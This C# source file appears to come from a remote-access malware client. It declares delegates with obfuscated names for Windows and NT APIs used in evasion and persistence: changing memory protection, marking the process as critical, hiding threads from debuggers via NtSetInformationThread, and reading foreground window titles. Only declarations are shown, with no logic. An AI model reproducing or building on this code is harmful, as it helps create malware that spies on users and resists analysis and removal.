using System;
using System.Text;

namespace Client.Helper;

public class Delegates
{
	public delegate IntPtr DSBnjin8bs92nbjfsdi(string lpModuleName);

	public delegate IntPtr dsUinnb8sdn9g8bngs();

	public delegate int buhsdINJOMF9nuijm(IntPtr hWnd, StringBuilder text, int count);

	public delegate uint gdfudsin8shd2(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect);

	public delegate bool gvSUDINJons29fg(string lpDirectoryName, ref long lpFreeBytesAvailable, ref long lpTotalNumberOfBytes, ref long lpTotalNumberOfFreeBytes);

	public delegate DllImport.EXECUTION_STATE dsGFGdg(DllImport.EXECUTION_STATE esFlags);

	public delegate void dsRtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	public delegate uint dsNtSetInformationThread(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, uint threadInformationLength);

	public delegate bool dsFlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
}
